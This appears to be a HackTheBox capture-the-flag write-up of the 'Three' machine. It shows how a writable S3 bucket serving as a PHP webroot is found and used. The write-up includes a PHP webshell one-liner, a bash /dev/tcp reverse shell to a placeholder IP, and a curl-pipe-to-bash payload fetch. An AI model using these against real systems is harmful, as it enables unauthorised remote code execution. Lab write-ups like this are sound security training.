# HTB — Three 🟢

> **OS:** Linux &nbsp;|&nbsp; **Difficulty:** Easy &nbsp;|&nbsp; **Topics:** AWS S3, Cloud Misconfiguration, PHP Webshell, Subdomain Enumeration

---

## Overview

This box is all about a misconfigured AWS S3 bucket being used as the webroot of a PHP website. I enumerated subdomains, found the exposed S3 endpoint, uploaded a PHP reverse shell directly into the webroot, and caught a shell back on my machine.

---

## 01 — Recon (Nmap)

I started with an Nmap scan to see what ports were open:

```bash
sudo nmap -sV 10.129.227.248
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
```

Only two ports — **22 (SSH)** and **80 (HTTP)**. Nothing exotic, so I went straight to the web app.

---

## 02 — Web Enumeration

I browsed to the site and found a static concert ticket booking page. Nothing functional, but I dug into the source code and noticed the Contact form was POSTing to `/action_page.php` — so the backend was running **PHP**. Visiting `/index.php` directly also worked, which confirmed it.

More importantly, I found an email address in the Contact section using the domain `thetoppers.htb`. That told me the machine was using virtual hosting, so I added it to my hosts file:

```bash
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
```

---

## 03 — Subdomain Enumeration

With a domain in hand, I suspected there might be hidden subdomains. I ran `gobuster` in vhost mode:

```bash
gobuster vhost \
  -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://thetoppers.htb
```

```
Found: s3.thetoppers.htb (Status: 404) [Size: 21]
```

> **Finding:** The subdomain `s3.thetoppers.htb` — the name "s3" immediately suggested an AWS S3 bucket endpoint.

I added it to `/etc/hosts` and visited it:

```bash
echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

Browsing to `http://s3.thetoppers.htb` returned just `{"status": "running"}` — minimal, but the service was live.

---

## 04 — Enumerating the S3 Bucket

I used `awscli` to poke at it. Since the bucket had no real auth configured, I just set dummy values:

```bash
aws configure
# Access Key ID:     temp
# Secret Access Key: temp
# Default region:    us-east-1
# Output format:     json
```

Then I listed all available buckets:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

```
2024-01-01 00:00:00 thetoppers.htb
```

Found a bucket named `thetoppers.htb`. I listed its contents:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

```
                           PRE images/
2024-01-01 00:00:00          0 .htaccess
2024-01-01 00:00:00       5378 index.php
```

> ⚠️ **Critical Finding:** The bucket contains `index.php` and `.htaccess` — this is the actual **web root** of the site running on port 80. Apache is serving files directly from this S3 bucket, meaning anything I upload here becomes accessible through the website.

---

## 05 — Uploading a PHP Webshell

Since the server runs PHP and I could write to the bucket, I created a simple PHP webshell that reads a `cmd` URL parameter and passes it to `system()`:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

```
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

I then visited the shell in the browser and tested RCE with a quick `id`:

```
http://thetoppers.htb/shell.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> ✅ **RCE Confirmed** — I had remote code execution as `www-data`.

---

## 06 — Catching a Reverse Shell

A webshell is useful but I wanted a proper interactive shell. I grabbed my `tun0` IP with `ifconfig`, then wrote a bash reverse shell into a file:

```bash
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/1337 0>&1
```

I opened two terminals — one for the listener, one to serve the file:

```bash
# Terminal 1 — catch the connection
nc -nvlp 1337
```

```bash
# Terminal 2 — serve the payload (run from the same directory as shell.sh)
python3 -m http.server 8000
```

Then I triggered the payload through the webshell using `curl` piped to `bash`:

```
http://thetoppers.htb/shell.php?cmd=curl%20YOUR_IP:8000/shell.sh|bash
```

> ✅ **Shell caught** — Netcat got the connection. I had an interactive shell as `www-data`.

---

## 07 — Grabbing the Flag

With shell access, the flag was sitting right at `/var/www/flag.txt`:

```bash
cat /var/www/flag.txt
```

---

## Attack Chain

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found ports 22 and 80 |
| 2 | Source code review | Discovered `thetoppers.htb` domain |
| 3 | Gobuster vhost | Found `s3.thetoppers.htb` |
| 4 | awscli enumeration | Confirmed S3 bucket = webroot |
| 5 | PHP webshell upload | Remote code execution as www-data |
| 6 | curl \| bash reverse shell | Interactive shell |
| 7 | cat /var/www/flag.txt | 🏁 Flag |

---

## Key Takeaways

- **Never expose an S3 bucket without authentication** — especially one serving as a webroot. If an attacker can write files to your bucket, they can upload a shell and own the server.
- **Always enumerate subdomains.** The main site looked totally harmless — the real attack surface was hiding on a subdomain.
- **S3 + PHP webroot = game over.** Combining a publicly writable S3 bucket with a PHP-enabled web server is one of the most dangerous misconfigurations you can make.

---

*HackTheBox — Three | Write-up by [your handle](https://github.com/)*
